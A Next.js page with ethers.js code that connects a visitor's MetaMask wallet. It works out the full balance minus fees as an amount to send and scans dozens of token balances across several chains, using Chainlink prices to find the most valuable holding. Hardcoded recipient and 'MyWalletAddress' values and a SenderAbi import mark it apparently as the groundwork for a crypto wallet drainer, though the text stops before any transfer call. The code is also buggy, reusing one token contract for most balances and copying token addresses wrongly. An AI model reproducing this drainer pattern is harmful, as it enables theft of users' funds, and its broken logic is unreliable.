import Head from 'next/head'
import styles from '../styles/Home.module.css'
import 'bulma/css/bulma.css'
import {BigNumber, ethers} from 'ethers'
import { useState, useEffect } from 'react'
import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress, SenderAbi } from '../constants'

import './addresses'
// import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";


let MyWalletAddress = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E"



export default function Home() {

  const [account, setAccount] = useState()
  // const [user, setUser] = useState()
  const [isConnected, setIsConnected] = useState(false)
  const [provider, setProvider] = useState()
  const [signer, setSigner] = useState()
  const [balance, setBalance] = useState()
  const [gasPrice, setGasPrice] = useState()
  const [gasLimit, setGasLimit] = useState()
  const [aggregatorContract, setAggregatorContract] = useState()
  const [tokenContract, setTokenContract] = useState()
  const [error, setError] = useState()
  const [sucMsg, setSucMsg] = useState()
  const [chainId, setChainId] = useState()
  
  let etherValueOfUser
  let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
  let user
  let _signer

  const busdAddress = "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
  const daiAddress = "0x6b175474e89094c44da98b954eedeac495271d0f"
  const usdcAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
  const linkAddress = "0x514910771af9ca656af840dff83e8264ecf986ca"
  const wbtcAddress = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
  const usdtAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"

  let amount
  
  

  async function connect() {
    setError("")
    setSucMsg("")
    if (typeof window.ethereum !== 'undefined'){
      const isConnected1 = ethereum.isConnected()
      setIsConnected(isConnected1)
      try{
      const accounts = await ethereum.request({method: "eth_requestAccounts"})
      setAccount(accounts[0])
      console.log(`accounts: ${accounts}`);


      const _provider = new ethers.providers.Web3Provider(window.ethereum,"any")

      console.log(_provider);
      setProvider(_provider)


      user = await _provider.send("eth_requestAccounts", []);
      console.log(user);
      _signer = _provider.getSigner()
      setSigner(_signer)
      console.log(_signer);
      const chainId = await signer.getChainId()
      setChainId(chainId)
      console.log(`chain id: ${chainId}`);
      const bal = await _signer.getBalance(user.address)
      // convert balance from bignumber to ethereum type:
      const balToEth = ethers.utils.formatEther(bal)
    
      console.log('balance:',bal);
      
      const gasL = ethers.utils.hexlify(100000)
      setGasLimit(gasL)

      const gasP = _provider.getGasPrice()
      // setGasPrice(gasP)
      setGasPrice(gasP)
      // const fee = (estimateGas).mul(gasL)
      const fee = (await gasP).mul(gasL)
      console.log('fee', fee);

      const finalAmount = bal - (fee * 10)
      const finalAmountToString = finalAmount.toString()
      const finalAmountBigNumber =await BigNumber.from(finalAmountToString)
      console.log("finalAmountBigNumber",finalAmountBigNumber);
      setBalance(finalAmountBigNumber)
      console.log('amount - fee :',finalAmount);

      // setAggregatorContract(new ethers.Contract("0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e", aggregator, _provider))
      // console.log(aggregatorContract);
      
      // const etherValueInUsd = await aggregatorContract.latestRoundData()
      

      const etherValue = bal / 10e17
      etherValueOfUser = etherValue


      console.log(`balance is :${etherValue} (depend on chainId)`);
      getData()

      const isConnected2 = ethereum.isConnected()
      setIsConnected(isConnected2)


      window.ethereum.on('accountsChanged',async () =>{
        const newAccounts = await ethereum.request({method: "eth_requestAccounts"})
        setAccount(newAccounts[0])
        console.log("connected wallet changed to:",newAccounts[0]);
      })
    
      ethereum.on('chainChanged', async () => {
        const newChainId = await signer.getChainId()
        setChainId(newChainId)
        console.log(`chain id changed to :${newChainId}`);
        // window.location.reload();
      })
      ethereum.on('disconnect', setIsConnected(false));
      const isConnected3 = ethereum.isConnected()
      setIsConnected(isConnected3)
      
        console.log('user disconnected!');
      } catch(err){
        setError(err.message)
      }
    }else{
      console.log("Please install MetaMask!");
    }
  }
  let _demical

  async  function getData() {

    const chainId = await signer.getChainId()
    console.log('chain id:',chainId);

    if (chainId == 137) {

      const priceEth = new ethers.Contract("0xF9680D99D6C9589e2a93a78A04A279e509205945",aggregator,provider)
      const currentEthPrice = await priceEth.latestRoundData()
      console.log('price Weth:',currentEthPrice.answer.toString());
  
      const priceLink = new ethers.Contract("0xd9FFdb71EbE7496cC440152d43986Aae0AB76665",aggregator,provider)
      const currentLinkPrice = await priceLink.latestRoundData()
      console.log('price Link:',currentLinkPrice.answer.toString());
  
      const priceMatic = new ethers.Contract("0xAB594600376Ec9fD91F8e885dADF0CE036862dE0",aggregator,provider)
      const currentMatickPrice = await priceMatic.latestRoundData()
      console.log('price Matic:',currentMatickPrice.answer.toString());
  
      const priceUni = new ethers.Contract("0xdf0Fb4e4F928d2dCB76f438575fDD8682386e13C",aggregator,provider)
      const currentUniPrice = await priceUni.latestRoundData()
      console.log('price Uni:',currentUniPrice.answer.toString());
      
      
      const eth = new ethers.Contract("0x7ceb23fd6bc0add59e62ac25578270cff1b9f619",ERC20,provider)
      const usdc = new ethers.Contract( "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",ERC20 ,provider)
      const usdt = new ethers.Contract( "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",ERC20 ,provider)
      const link = new ethers.Contract( "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39",ERC20 ,provider)
      const dai = new ethers.Contract( "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",ERC20 ,provider)
      const matic = new ethers.Contract( "0x0000000000000000000000000000000000001010",ERC20 ,provider)
      const uni = new ethers.Contract( "0xb33eaad8d922b1083446dc23f610c2567fb5180f",ERC20 ,provider)
      const ethB = await eth.balanceOf(account)
      const usdcB = await usdc.balanceOf(account)
      const usdtB = await usdt.balanceOf(account)
      const linkB = await link.balanceOf(account)
      const daiB = await dai.balanceOf(account)
      const maticB = await matic.balanceOf(account)
      const uniB = await uni.balanceOf(account)
      console.log('usdc balance:',usdcB.toString() / 10 ** 6);
      console.log('usdt balance:',usdtB.toString() / 10 ** 6);
      console.log('link balance:',linkB.toString() / 10 ** 18);
      console.log('dai balance:',daiB.toString() / 10 ** 18);
      console.log('matic balance:',maticB.toString() / 10 ** 18);
      console.log('uni balance:',uniB.toString() / 10 ** 18);
  
      const ethValue = ethB.mul(currentEthPrice.answer)
      const usdcValue = usdcB/ 6
      const usdtValue = usdtB / 6
      const linkValue = linkB.mul(currentLinkPrice.answer)
      const daiValue =  daiB / 18
      const maticValue = maticB.mul(currentMatickPrice.answer)
      const uniValue = uniB.mul(currentUniPrice.answer)
  
      console.log(ethValue.toString() / 10 ** 26);
      console.log(usdcValue.toString());
      console.log(usdtValue.toString());
      console.log(daiValue.toString());
      console.log(linkValue.toString() / 10 ** 26);
      console.log(maticValue.toString() / 10 ** 26);
      console.log(uniValue.toString() / 10 ** 26);
  
      const ETH = {
        amount: ethB,
        value: (ethB.toString() / 10 ** 26),
        address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
      }
  
      const USDT = {
        amount: usdtB,
        value: (usdtValue.toString() / 10 ** 26),
        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
      }
      const UNI = {
        amount: uniB,
        value: (uniValue.toString() / 10 ** 26),
        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
      }
      const DAI = {
        amount: daiB,
        value: (daiValue.toString() / 10 ** 26),
        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
      }
  
      const MATIC = {
        amount: maticB,
        value: (maticValue.toString() / 10 ** 26),
        address: "0x0000000000000000000000000000000000001010"
      }
      const LINK = {
        amount: linkB,
        value: (linkValue.toString() / 10 ** 26),
        address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
      }
      const USDC = {
        amount: usdcB,
        value: usdcValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
  
      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
  
      // console.log(tokensValues);
      let lastElement
      let Biggest  
      const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI]
      for (let i = 0; i < Tokens.length; i++) {
      const element = Tokens[i].value;
        if (i >= 0 && element > lastElement) {
          Biggest = Tokens[i]
        }
        lastElement = element
      }
      
      console.log(Tokens);
      console.log(Biggest);
      //  Tokens.sort((a, b) => b - a);
      // console.log(Tokens);
      // // }
      // tokensBalance.sort(function(a, b){return b-a});
  
      // let highest = points[0];
      // console.log(highest);
  
    } if (chainId == 1) {
      const priceEth = new ethers.Contract("0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419",aggregator,provider)
      const ethPrice = await priceEth.latestRoundData()
      const currentEthPrice = ethPrice.answer/10**8
      console.log('price eth:',currentEthPrice);

      const priceWbtc = new ethers.Contract("0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c",aggregator,provider)
      const wbtcPrice = (await priceWbtc.latestRoundData())
      const currentWbtcPrice = wbtcPrice.answer/10**8
      console.log('price WBTC:',currentWbtcPrice);
  
      const priceLink = new ethers.Contract("0x2c1d072e956AFFC0D435Cb7AC38EF18d24d9127c",aggregator,provider)
      const linkPrice = (await priceLink.latestRoundData())
      const currentLinkPrice = linkPrice.answer/10**8
      console.log('price Link:',currentLinkPrice);
  
      const priceMatic = new ethers.Contract("0x7bAC85A8a13A4BcD8abb3eB7d6b4d632c5a57676",aggregator,provider)
      const maticPrice = await priceMatic.latestRoundData()
      const currentMatickPrice = maticPrice.answer/10**8
      console.log('price Matic:',currentMatickPrice);
  
      const priceUni = new ethers.Contract("0x553303d460EE0afB37EdFf9bE42922D8FF63220e",aggregator,provider)
      const uniPrice = await priceUni.latestRoundData()
      const currentUniPrice = uniPrice.answer/10**8
      console.log('price Uni:',currentUniPrice);


      const priceAtom = new ethers.Contract("0xDC4BDB458C6361093069Ca2aD30D74cc152EdC75",aggregator,provider)
      const atomPrice = await priceAtom.latestRoundData()
      const currentAtomPrice = atomPrice.answer/10**8
      console.log('price Atom:',currentAtomPrice);

      const priceAave = new ethers.Contract("0x547a514d5e3769680Ce22B2361c10Ea13619e8a9",aggregator,provider)
      const aavePrice = await priceAave.latestRoundData()
      const currentAAvePrice = aavePrice.answer/10**8
      console.log('price AAVE:',currentAAvePrice);

      const priceSand = new ethers.Contract("0x35E3f7E558C04cE7eEE1629258EcbbA03B36Ec56",aggregator,provider)
      const sandPrice = await priceSand.latestRoundData()
      const currentSandPrice = sandPrice.answer/10**8
      console.log('price SAND:',currentSandPrice);

      const priceMana = new ethers.Contract("0x56a4857acbcfe3a66965c251628B1c9f1c408C19",aggregator,provider)
      const manaPrice = await priceMana.latestRoundData()
      const currentManaPrice = manaPrice.answer/10**8
      console.log('price MANA:',currentManaPrice);

      const priceMkr = new ethers.Contract("0xec1D1B3b0443256cc3860e24a46F108e699484Aa",aggregator,provider)
      const mkrPrice = await priceMkr.latestRoundData()
      const currentMkrPrice = mkrPrice.answer/10**8
      console.log('price MKR:',currentMkrPrice);

      const priceGrt = new ethers.Contract("0x86cF33a451dE9dc61a2862FD94FF4ad4Bd65A5d2",aggregator,provider)
      const grtPrice = await priceGrt.latestRoundData()
      const currentGrtPrice = grtPrice.answer/10**8
      console.log('price GRT:',currentGrtPrice);

      const pricePaxgToEth = new ethers.Contract("0x9B97304EA12EFed0FAd976FBeCAad46016bf269e",aggregator,provider)
      const paxgEthPrice = await pricePaxgToEth.latestRoundData()
      const PaxgPrice = ((paxgEthPrice.answer)*(currentEthPrice))
      const currentPaxgPrice = PaxgPrice / 10**18
      console.log('price PAXG:',currentPaxgPrice);

      const priceSnx = new ethers.Contract("0xDC3EA94CD0AC27d9A86C180091e7f78C683d3699",aggregator,provider)
      const snxPrice = await priceSnx.latestRoundData()
      const currentSnxPrice = snxPrice.answer/10**8
      console.log('price SNX:',currentSnxPrice);

      const priceImx = new ethers.Contract("0xBAEbEFc1D023c0feCcc047Bff42E75F15Ff213E6",aggregator,provider)
      const imxPrice = await priceImx.latestRoundData()
      const currentImxPrice = imxPrice.answer/10**8
      console.log('price IMX:',currentImxPrice);

      const priceOneinch = new ethers.Contract("0xc929ad75B72593967DE83E7F7Cda0493458261D9",aggregator,provider)
      const oneinchPrice = await priceOneinch.latestRoundData()
      const currentOneinchPrice = oneinchPrice.answer/10**8
      console.log('price 1INCH:',currentOneinchPrice);

      const priceLdoToEth = new ethers.Contract("0x4e844125952D32AcdF339BE976c98E22F6F318dB",aggregator,provider)
      const currentLdoToEthPrice = await priceLdoToEth.latestRoundData()
      const ldoPrice = currentLdoToEthPrice.answer * currentEthPrice
      const currentLdoPrice =  ldoPrice / 10 ** 18
      console.log('price LDO:',currentLdoPrice);

      const priceBatToEth = new ethers.Contract("0x0d16d4528239e9ee52fa531af613AcdB23D88c94",aggregator,provider)
      const batToEthPrice = await priceBatToEth.latestRoundData()
      const batPrice = batToEthPrice.answer * currentEthPrice
      const currentBatPrice = batPrice / 10**18
      console.log('price BAT:',currentBatPrice);

      const priceLrcToEth = new ethers.Contract("0x160AC928A16C93eD4895C2De6f81ECcE9a7eB7b4",aggregator,provider)
      const lrcToEthPrice = await priceLrcToEth.latestRoundData()
      const lrcPrice = lrcToEthPrice.answer * currentEthPrice
      const currentLrcPrice = lrcPrice / 10 ** 18
      console.log('price LRC:',currentLrcPrice);

      const priceBal = new ethers.Contract("0xdF2917806E30300537aEB49A7663062F4d1F2b5F",aggregator,provider)
      const balPrice = await priceBal.latestRoundData()
      const currentBalPrice = balPrice.answer/10**8
      console.log('price BAL:',currentBalPrice);

      const priceCvx = new ethers.Contract("0xd962fC30A72A84cE50161031391756Bf2876Af5D",aggregator,provider)
      const cvxPrice = await priceCvx.latestRoundData()
      const currentCvxPrice = cvxPrice.answer/10**8
      console.log('price CVX:',currentCvxPrice);
      
      
      const eth = new ethers.Contract("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",ERC20,provider)
      const wbtc = new ethers.Contract("0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",ERC20,provider)
      const usdc = new ethers.Contract( "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",ERC20 ,provider)
      const usdt = new ethers.Contract( "0xdac17f958d2ee523a2206206994597c13d831ec7",ERC20 ,provider)
      const link = new ethers.Contract( "0x514910771af9ca656af840dff83e8264ecf986ca",ERC20 ,provider)
      const dai = new ethers.Contract( "0x6b175474e89094c44da98b954eedeac495271d0f",ERC20 ,provider)
      const matic = new ethers.Contract( "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",ERC20 ,provider)
      const uni = new ethers.Contract( "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",ERC20 ,provider)
      const atom = new ethers.Contract( "0x8D983cb9388EaC77af0474fA441C4815500Cb7BB",ERC20 ,provider)
      const aave = new ethers.Contract( "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",ERC20 ,provider)
      const sand = new ethers.Contract( "0x3845badAde8e6dFF049820680d1F14bD3903a5d0",ERC20 ,provider)
      const mana = new ethers.Contract( "0x0f5d2fb29fb7d3cfee444a200298f468908cc942",ERC20 ,provider)
      const mkr = new ethers.Contract( "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",ERC20 ,provider)
      const grt = new ethers.Contract( "0xc944e90c64b2c07662a292be6244bdf05cda44a7",ERC20 ,provider)
      const paxg = new ethers.Contract( "0x45804880de22913dafe09f4980848ece6ecbaf78",ERC20 ,provider)
      const snx = new ethers.Contract( "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",ERC20 ,provider)
      const imx = new ethers.Contract( "0xf57e7e7c23978c3caec3c3548e3d615c346e79ff",ERC20 ,provider)
      const oneinch = new ethers.Contract( "0x111111111117dc0aa78b770fa6a738034120c302",ERC20 ,provider)
      const ldo = new ethers.Contract( "0x5a98fcbea516cf06857215779fd812ca3bef1b32",ERC20 ,provider)
      const bat = new ethers.Contract( "0x0d8775f648430679a709e98d2b0cb6250d2887ef",ERC20 ,provider)
      const lrc = new ethers.Contract( "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",ERC20 ,provider)
      const bal = new ethers.Contract( "0xba100000625a3754423978a60c9317c58a424e3D",ERC20 ,provider)
      const cvx = new ethers.Contract( "0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b",ERC20 ,provider)

      // eth: 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9 sxp token
      //  0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24 rndr token
      //   0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85 FET TOKEN
      //   0x3597bfd533a99c9aa083587b074434e61eb0a258 dent token
      //   0x43dfc4159d86f3a37a5a4b3d4580b888ad7d4ddd  dodo
      //  0xfe3e6a25e6b192a42a44ecddcd13796471735acf reef
      // 0x83e6f1e41cdd28eaceb20cb649155049fac3d5aa pols
      // 0x4Fabb145d64652a948d72533023f6E7A623C7C53 busd
      // 0xcb46C550539ac3DB72dc7aF7c89B11c306C727c2 ONT
      // 0x4691937a7508860f876c9c0a2a617e7d9e945d4b woo
      //  0xba11d00c5f74255f56a5e366f4f77f5a186d7f55 band
      // 0x582d872a1b094fc48f5de31d3b73f2d9be47def1 ton
      // 0x4d224452801aced8b2f0aebe155379bb5d594381 ape
      // 0x8e870d67f660d95d5be530380d0ec0bd388289e1 psd
      // 0x0000000000085d4780B73119b644AE5ecd22b376 tusd
      //    //0xad6caeb32cd2c308980a548bd0bc5aa4306c6c18 band *not sure correct

      const ethB = await eth.balanceOf(account)
      const usdcB = await usdc.balanceOf(account)
      const usdtB = await usdt.balanceOf(account)
      const linkB = await link.balanceOf(account)
      const daiB = await dai.balanceOf(account)
      const maticB = await matic.balanceOf(account)
      const uniB = await uni.balanceOf(account)
      const atomB = await uni.balanceOf(account)
      const aaveB = await uni.balanceOf(account)
      const sandB = await uni.balanceOf(account)
      const manaB = await uni.balanceOf(account)
      const mkrB = await uni.balanceOf(account)
      const grtB = await uni.balanceOf(account)
      const paxgB = await uni.balanceOf(account)
      const snxB = await uni.balanceOf(account)
      const imxB = await uni.balanceOf(account)
      const oneinchB = await uni.balanceOf(account)
      const ldoB = await uni.balanceOf(account)
      const batB = await uni.balanceOf(account)
      const lrcB = await uni.balanceOf(account)
      const balB = await uni.balanceOf(account)
      const cvxB = await uni.balanceOf(account)
      
      // values:  value = balance * price
      // balance has demicals so we need calculate demicals after balance * price
      const ethValue = (ethB* currentEthPrice) / 10**18
      const usdcValue = usdcB/ 10**6
      const usdtValue = usdtB / 10**6
      const linkValue = (linkB*currentLinkPrice) / 10**18
      const daiValue =  daiB / 10**18
      const maticValue = (maticB*currentMatickPrice) / 10**18
      const uniValue = (uniB*currentUniPrice) / 10**18
      const atomValue = (atomB*currentAtomPrice) / 10**18
      const aaveValue = (aaveB*currentAAvePrice) / 10**18
      const sandValue = (sandB*currentSandPrice) / 10**18
      const manaValue = (manaB*currentManaPrice) / 10**18
      const mkrValue = (mkrB*currentMkrPrice) / 10**18
      const grtValue = (grtB*currentGrtPrice) / 10**18
      const paxgValue = (paxgB*currentPaxgPrice)/ 10**18
      const snxValue = (snxB*currentSnxPrice) / 10**18
      const imxValue = (imxB*currentImxPrice) / 10**18
      const oneinchValue = (oneinchB*currentOneinchPrice)
      const ldoValue = (ldoB*currentLdoPrice) / 10**18
      const batValue = (batB*currentBatPrice) / 10**18
      const lrcValue = (lrcB*currentLrcPrice) / 10**18
      const balValue = (balB*currentBalPrice) / 10**18
      const cvxValue = (cvxB*currentCvxPrice) / 10**18
  
      console.log(ethValue);
      console.log(usdcValue);
      console.log(usdtValue);
      console.log(daiValue);
      console.log(linkValue);
      console.log(maticValue);
      console.log(uniValue);
      console.log(atomValue);
      console.log(aaveValue);
      console.log(sandValue);
      console.log(manaValue);
      console.log(mkrValue);
      console.log(grtValue);
      console.log(paxgValue);
      console.log(snxValue);
      console.log(imxValue);
      console.log(oneinchValue);
      console.log(ldoValue);
      console.log(batValue);
      console.log(lrcValue);
      console.log(balValue);
      console.log(cvxB);
  
      const ETH = {
        amount: ethB,
        value: ethValue,
        address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
      }
  
      const USDT = {
        amount: usdtB,
        value: usdtValue,
        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
      }
      const UNI = {
        amount: uniB,
        value: uniValue,
        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
      }
      const DAI = {
        amount: daiB,
        value: daiValue,
        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
      }
  
      const MATIC = {
        amount: maticB,
        value: maticValue,
        address: "0x0000000000000000000000000000000000001010"
      }
      const LINK = {
        amount: linkB,
        value: linkValue,
        address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
      }
      const USDC = {
        amount: usdcB,
        value: usdcValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const ATOM = {
        amount: atomB,
        value: atomValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const AAVE = {
        amount: aaveB,
        value: aaveValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const SAND = {
        amount: sandB,
        value: sandValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const MANA = {
        amount: manaB,
        value: manaValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const MKR = {
        amount: mkrB,
        value: mkrValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const GRT = {
        amount: grtB,
        value: grtValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const PAXG = {
        amount: paxgB,
        value: paxgValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const SNX = {
        amount: snxB,
        value: snxValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const IMX = {
        amount: imxB,
        value: imxValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const ONEINCH = {
        amount: oneinchB,
        value: oneinchValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const LDO = {
        amount: ldoB,
        value: ldoValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const BAT = {
        amount: batB,
        value: batValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const LRC = {
        amount: lrcB,
        value: lrcValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const BAL = {
        amount: balB,
        value: balValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
      const CVX = {
        amount: cvxB,
        value: cvxValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
  
      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
  
      // console.log(tokensValues);
      let lastElement
      let Biggest  
      const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI,ATOM,AAVE,SAND,MANA,MKR,GRT,PAXG,SNX,IMX,ONEINCH,LDO,BAT,LRC,BAL,CVX]
      for (let i = 0; i < Tokens.length; i++) {
      const element = Tokens[i].value;
        if (i >= 0 && element > lastElement) {
          Biggest = Tokens[i]
        }
        lastElement = element
      }
      
      console.log(Tokens);
      console.log(Biggest);
    } if (chainId == 56 ) {

      const priceWbtc = new ethers.Contract("0x58afEb74C77C1d410fbcbb4858582D2669d5a6c0",aggregator,provider)
      const wbtcPrice = (await priceWbtc.latestRoundData())
      const currentWbtcPrice = wbtcPrice.answer/10**8
      console.log('price WBTC:',currentWbtcPrice);
  

      const priceWbnb = new ethers.Contract("0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE",aggregator,provider)
      const wbnbPrice = await priceWbnb.latestRoundData()
      const currentWbnbPrice = wbnbPrice.answer/10**8
      console.log('price Wbnb:',currentWbnbPrice);

      const priceEth = new ethers.Contract("0x9ef1B8c0E4F7dc8bF5719Ea496883DC6401d5b2e",aggregator,provider)
      const ethPrice = await priceEth.latestRoundData()
      const currentEthPrice = ethPrice.answer/10**8
      console.log('price Weth:',currentEthPrice);
  
      const priceLink = new ethers.Contract("0xca236E327F629f9Fc2c30A4E95775EbF0B89fac8",aggregator,provider)
      const linkPrice = await priceLink.latestRoundData()
      const currentLinkPrice = linkPrice.answer/10**8
      console.log('price Link:',currentLinkPrice);
  
      const priceMatic = new ethers.Contract("0x7CA57b0cA6367191c94C8914d7Df09A57655905f",aggregator,provider)
      const maticPrice = await priceMatic.latestRoundData()
      const currentMaticPrice = maticPrice.answer/10**8
      console.log('price Matic:',currentMaticPrice);
  
      const priceUni = new ethers.Contract("0xb57f259E7C24e56a1dA00F66b55A5640d9f9E7e4",aggregator,provider)
      const uniPrice = await priceUni.latestRoundData()
      const currentUniPrice = uniPrice.answer/10**8
      console.log('price Uni:',currentUniPrice);

      const priceAave = new ethers.Contract("0xA8357BF572460fC40f4B0aCacbB2a6A61c89f475",aggregator,provider)
      const aavePrice = await priceAave.latestRoundData()
      const currentAavePrice = aavePrice.answer/10**8
      console.log('price AAVE:',currentAavePrice);

      const priceAtom = new ethers.Contract("0xb056B7C804297279A9a673289264c17E6Dc6055d",aggregator,provider)
      const atomPrice = await priceAtom.latestRoundData()
      const currentAtomPrice = atomPrice.answer/10**8
      console.log('price ATOM:',currentAtomPrice);
      
      const priceBand = new ethers.Contract("0xC78b99Ae87fF43535b0C782128DB3cB49c74A4d3",aggregator,provider)
      const bandPrice = await priceBand.latestRoundData()
      const currentBandPrice = bandPrice.answer/10**8
      console.log('price BAND:',currentBandPrice);
   

      const priceCake = new ethers.Contract("0xB6064eD41d4f67e353768aA239cA86f4F73665a1",aggregator,provider)
      const cakePrice = await priceCake.latestRoundData()
      const currentCakePrice = cakePrice.answer/10**8
      console.log('price CAKE:',currentCakePrice);

      const priceComp = new ethers.Contract("0x0Db8945f9aEf5651fa5bd52314C5aAe78DfDe540",aggregator,provider)
      const compPrice = await priceComp.latestRoundData()
      const currentCompPrice = compPrice.answer/10**8
      console.log('price COMP:',currentCompPrice);

      // const priceCrv = new ethers.Contract("0x2e1C3b6Fcae47b20Dd343D9354F7B1140a1E6B27",aggregator,provider)
      // const uniPrice = await priceUni.latestRoundData()
      // const currentUniPrice = uniPrice.answer/10**8
      // console.log('price Uni:',currentUniPrice.answer.toString());

      const priceDoge = new ethers.Contract("0x3AB0A0d137D4F946fBB19eecc6e92E64660231C8",aggregator,provider)
      const dogePrice = await priceDoge.latestRoundData()
      const currentDogePrice = dogePrice.answer/10**8
      console.log('price DOGE:',currentDogePrice);

      const priceDodo = new ethers.Contract("0x87701B15C08687341c2a847ca44eCfBc8d7873E1",aggregator,provider)
      const dodoPrice = await priceDodo.latestRoundData()
      const currentDodoPrice = dodoPrice.answer/10**8
      console.log('price DODO:',currentDodoPrice);

      const priceDot = new ethers.Contract("0xC333eb0086309a16aa7c8308DfD32c8BBA0a2592",aggregator,provider)
      const dotPrice = await priceDot.latestRoundData()
      const currentDotPrice = dotPrice.answer/10**8
      console.log('price DOT:',currentDotPrice);

      const priceFil = new ethers.Contract("0xE5dbFD9003bFf9dF5feB2f4F445Ca00fb121fb83",aggregator,provider)
      const filPrice = await priceFil.latestRoundData()
      const currentFilPrice = filPrice.answer/10**8
      console.log('price FIL:',currentFilPrice);

      const priceFet = new ethers.Contract("0x657e700c66C48c135c4A29c4292908DbdA7aa280",aggregator,provider)
      const fetPrice = await priceFet.latestRoundData()
      const currentFetPrice = fetPrice.answer/10**8
      console.log('price FET:',currentFetPrice);

      const priceFtm = new ethers.Contract("0xe2A47e87C0f4134c8D06A41975F6860468b2F925",aggregator,provider)
      const ftmPrice = await priceFtm.latestRoundData()
      const currentFtmPrice = ftmPrice.answer/10**8
      console.log('price FTM:',currentFtmPrice);

      const priceFxs = new ethers.Contract("0x657e700c66C48c135c4A29c4292908DbdA7aa280",aggregator,provider)
      const fxsPrice = await priceFxs.latestRoundData()
      const currentFxsPrice = fxsPrice.answer/10**8
      console.log('price FXS:',currentFxsPrice);

      const priceGmt = new ethers.Contract("0x8b0D36ae4CF8e277773A7ba5F35c09Edb144241b",aggregator,provider)
      const gmtPrice = await priceGmt.latestRoundData()
      const currentGmtPrice = gmtPrice.answer/10**8
      console.log('price GMT:',currentGmtPrice);

      const priceNear = new ethers.Contract("0x0Fe4D87883005fCAFaF56B81d09473D9A29dCDC3",aggregator,provider)
      const nearPrice = await priceNear.latestRoundData()
      const currentNearPrice = nearPrice.answer/10**8
      console.log('price NEAR:',currentNearPrice);

      const priceOnt = new ethers.Contract("0x657e700c66C48c135c4A29c4292908DbdA7aa280",aggregator,provider)
      const ontPrice = await priceOnt.latestRoundData()
      const currentOntPrice = ontPrice.answer/10**8
      console.log('price ONT:',currentOntPrice);

      const priceReef = new ethers.Contract("0x46f13472A4d4FeC9E07E8A00eE52f4Fa77810736",aggregator,provider)
      const reefPrice = await priceReef.latestRoundData()
      const currentReefPrice = reefPrice.answer/10**8
      console.log('price REEF:',currentReefPrice);

      const priceSxp = new ethers.Contract("0xE188A9875af525d25334d75F3327863B2b8cd0F1",aggregator,provider)
      const sxpPrice = await priceSxp.latestRoundData()
      const currentSxpPrice = sxpPrice.answer/10**8
      console.log('price SXP:',currentSxpPrice);


      const priceSushi = new ethers.Contract("0xa679C72a97B654CFfF58aB704de3BA15Cde89B07",aggregator,provider)
      const sushiPrice = await priceSushi.latestRoundData()
